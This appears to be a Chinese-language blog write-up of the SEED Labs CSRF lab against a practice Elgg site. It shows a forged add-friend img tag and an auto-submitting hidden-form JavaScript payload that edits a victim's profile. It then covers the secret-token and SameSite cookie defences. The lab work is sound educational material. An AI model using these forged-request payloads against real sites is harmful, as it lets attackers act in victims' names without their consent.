---
layout: post
title: "Cross-Site Request Forgery Attack Lab"
date: 2024-04-25
categories: [SEED-Labs, Web-Security]
tags: [CSRF]
---

# Cross-Site Request Forgery Attack Lab

CSRF攻击就是用户和一个正常网站有一个会话，一个攻击者网站通过向用户请求获得了正常网站的数据。

# Task 1  Observing HTTP Request

因为我平时抓包都是用burpsuite+chrome，所以这个任务我也是用burpsuite和chrome分别去看了一下他的包。

## GET请求

Chrome：

![Untitled](/assets/img/2024-04-25-Cross-Site Request Forgery Attack Lab/Untitled.png)

Burpsuite：

![Untitled](/assets/img/2024-04-25-Cross-Site Request Forgery Attack Lab/Untitled%201.png)

这里很有意思，发现chrome的包里多了一个 `Proxy-Connection` 头，后来知道这是浏览器发给代理服务器时包含的一个头。

但这个请求没有参数，我又找了一个有参数的。

![Untitled](/assets/img/2024-04-25-Cross-Site Request Forgery Attack Lab/Untitled%202.png)

这里就不去看burpsuite的包了，因为长得都是一样的。

## POST请求

在找回密码这里找到了一个POST请求和他的payload。

![Untitled](/assets/img/2024-04-25-Cross-Site Request Forgery Attack Lab/Untitled%203.png)

![Untitled](/assets/img/2024-04-25-Cross-Site Request Forgery Attack Lab/Untitled%204.png)

# Task 2 CSRF Attack using GET Request

首先要看一下正常加好友的请求是什么样的，所以先用alice加一下samy。

![Untitled](/assets/img/2024-04-25-Cross-Site Request Forgery Attack Lab/Untitled%205.png)

然后用samy发一个博客，博客中附上一个图片，图片的URL是添加好友的请求，也就是”http://www.seed-server.com/action/friends/add?friend=59”，这样alice访问samy的引人入胜的博客的时候就会发送一个这个URL的请求，然后就会主动添加samy为好友。

> 这里我没认真读lab的要求，所以下边是我自己想可以达到同样效果的一个攻击办法。
> 

![Untitled](/assets/img/2024-04-25-Cross-Site Request Forgery Attack Lab/Untitled%206.png)

可以看到在访问博客的过程中，alice发送了一个这个请求，然后就会成功添加samy为好友。

![Untitled](/assets/img/2024-04-25-Cross-Site Request Forgery Attack Lab/Untitled%207.png)

经过我测试开启了Chrome的标准防御也会添加好友。

以上是错误示范，接下来回到正规做法。

在index.html中加入下面这一句

```html
<img src="http://www.seed-server.com/action/friends/add?friend=59" />
```

alice访问这个页面的时候就会尝试去加载这个URL，然后发出好友请求。

![Untitled](/assets/img/2024-04-25-Cross-Site Request Forgery Attack Lab/Untitled%208.png)

观察发现跨域访问是没有cookie的，上网查了一下chrome取消了这个关闭samesite的选项，也就是说无论如何都关闭不了chrome的同源cookie检查。

Chrome太强了，javascript也不行，我找到了一个84版本的chrome，关闭了他的samesite flag，成功了！

![Untitled](/assets/img/2024-04-25-Cross-Site Request Forgery Attack Lab/Untitled%209.png)

后来发现其实这个lab的架构是希望我们写到”addfriend.html”里边，但这不重要。

# **Task 3 CSRF Attack using POST Request**

首先修改一次profile能观察到POST的payload。

![Screenshot 2024-04-19 at 11.33.31 PM.png](/assets/img/2024-04-25-Cross-Site Request Forgery Attack Lab/Screenshot_2024-04-19_at_11.33.31_PM.png)

这里事先查到了Alice的guid是56，所以成功修改她的profile，修改JS代码如下：

```jsx
function forge_post()
{
    var fields;

    // The following are form entries need to be filled out by attackers.
    // The entries are made hidden, so the victim won't be able to see them.
    fields += "<input type='hidden' name='name' value='Alice'>";
    fields += "<input type='hidden' name='briefdescription' value='Samy is my Hero'>";
    fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";         
    fields += "<input type='hidden' name='guid' value='56'>";

    // Create a <form> element.
    var p = document.createElement("form");

    // Construct the form
    p.action = "http://www.seed-server.com/action/profile/edit";
    p.innerHTML = fields;
    p.method = "post";

    // Append the form to the current page.
    document.body.appendChild(p);

    // Submit the form
    p.submit();
}
```

然后可看到POST成功。

![Untitled](/assets/img/2024-04-25-Cross-Site Request Forgery Attack Lab/Untitled%2010.png)

## Question 1

可以通过在网页中搜索，在”http://www.seed-server.com/members”这个api中有所有人的guid。

![Untitled](/assets/img/2024-04-25-Cross-Site Request Forgery Attack Lab/Untitled%2011.png)

## Question 2

这是我做的一些尝试，我发现无论是谁访问“http://www.seed-server.com/profile”的时候都会跳转到自己的profile，然后这个html中有name和guid，所以我就可以这样获取name和guid。

```jsx
async function forge_post()
{
    const response = await fetch('http://www.seed-server.com/profile');
    const html = await response.text();

    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');

    const guidElement = doc.evaluate('/html/body/div[1]/div[3]/div/div/div[2]/div[2]/div/div', doc, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
    const guidValue = guidElement ? parseInt(guidElement.getAttribute('data-page-owner-guid')) : null;
        
    const title = doc.title;
    const nameValue = title ? title.split(' :')[0] : null;

    var fields;

    // The following are form entries need to be filled out by attackers.
    // The entries are made hidden, so the victim won't be able to see them.
    fields += "<input type='hidden' name='name' value='${nameValue}'>";
    fields += "<input type='hidden' name='briefdescription' value='Samy is my Hero'>";
    fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";         
    fields += "<input type='hidden' name='guid' value='${guideValue}'>";

    // Create a <form> element.
    var p = document.createElement("form");

    // Construct the form
    p.action = "http://www.seed-server.com/action/profile/edit";
    p.innerHTML = fields;
    p.method = "post";

    // Append the form to the current page.
    document.body.appendChild(p);

    // Submit the form
    p.submit();
}
```

最后发现因为同源策略，JS是不能访问另一个域名的内容的，除非配置好了CORS头，所以这个方案是不可行的。

后边调研了一下是这样的：

1. 首先浏览器判断这是否是一个非简单请求。简单请求的定义是方法为 `HEAD` 、 `GET` 或 `POST` 之一，并且头部信息不超过规定的几种以及其他的一些约束的请求。
2. 如果是一个非简单请求，浏览器首先会发送一个预检请求，预检请求是一个 `OPTIONS` 方法的HTTP请求，这个请求会告诉服务器非简单请求的方法和头部，还会通过 `Origin` 头部发送自己的域名。
3. 服务器如果允许，他就会发送一个响应，这个响应通过三个CORS相关头部包含所有允许的方法、允许的头部和允许的域名。
4. 浏览器收到响应后发送真正的请求。
5. 服务器的响应仍然需要包含CORS头。

我还看到了另一个方案，就是遍历全部的人员。但我觉得这种方法不可行，因为这个JS代码每次都会跳转到另一个网站上，总不能让这个人访问这个页面n次，傻子都知道不对劲了。

# **Task 4 Enabling Elgg’s Countermeasure**

按照要求开启secret token防御，就是删掉那个return语句。

然后果然像文档说的那样，这个界面一直在请求，但是那边一直拒绝。

![Untitled](/assets/img/2024-04-25-Cross-Site Request Forgery Attack Lab/Untitled%2012.png)

# **Task 5 Experimenting with the SameSite Cookie Method**

可以看到三个cookie。

![Untitled](/assets/img/2024-04-25-Cross-Site Request Forgery Attack Lab/Untitled%2013.png)

访问”http://example32.com”的链接和表单三个cookie都会发送过去。

访问”http://attacker32.com”的链接和GET表单的时候，只用normal和lax发送过去了。使用POST表单的时候只有normal发送过去了。

这是因为设置 `Samesite=Strict` 的cookie只用访问同意域名才会发送； `Samesite=Lax` 的cookie在访问链接和GET请求时会发送，但是在POST请求时不会发送； `Samesite=None; Secure` 的cookie任何时候都会发送，但一般要求设置 `Secure` 选项，意味着只能通过https传输。

这里有一个表格具体阐述了lax类型的cookie的性质。

![Screenshot 2024-04-20 at 1.42.43 AM.png](/assets/img/2024-04-25-Cross-Site Request Forgery Attack Lab/Screenshot_2024-04-20_at_1.42.43_AM.png)

上述三个cookie分别被设置了strict、lax和none三种性质，所以才有上述表现。

## Bonus

经过搜索发现为这个应用添加同源cookie的方式最好就是在apache server的配置文件.htaccess中配置，其中”Header edit Set-Cookie ^(.*)$ $1;SameSite=Lax”是我添加的内容，添加好了之后重启容器。

```xml
<IfModule mod_headers.c>
        Header append Vary User-Agent env=!dont-vary
        Header edit Set-Cookie ^(.*)$ $1;SameSite=Lax
</IfModule>
```

尝试添加好友的时候就可以看到右下角的报错，根据上边那个表格我们知道 `<img src="">` 这个标签是不会发送lax类型的cookie的。

![Screenshot 2024-04-20 at 1.29.37 AM.png](/assets/img/2024-04-25-Cross-Site Request Forgery Attack Lab/Screenshot_2024-04-20_at_1.29.37_AM.png)

![Untitled](/assets/img/2024-04-25-Cross-Site Request Forgery Attack Lab/Untitled%2014.png)